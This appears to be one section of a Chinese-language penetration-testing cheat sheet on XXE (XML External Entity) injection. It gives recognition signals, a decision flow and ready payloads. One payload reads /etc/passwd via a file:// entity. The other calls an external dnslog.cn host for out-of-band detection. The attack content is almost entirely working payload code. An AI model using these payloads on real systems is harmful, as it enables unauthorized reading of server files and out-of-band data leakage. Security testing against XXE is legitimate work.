# §7 XXE
### 识别信号
- Content-Type: application/xml, SOAP, XML导入
### 决策流程
```
注入<!DOCTYPE> → 有文件回显=XXE ✅ | 无→带外XXE(外带DNSLOG)
```
### Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>   <!-- Tier1: own test account -->
<root>&xxe;</root>
```
### 带外
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxxx.dnslog.cn">]>
```
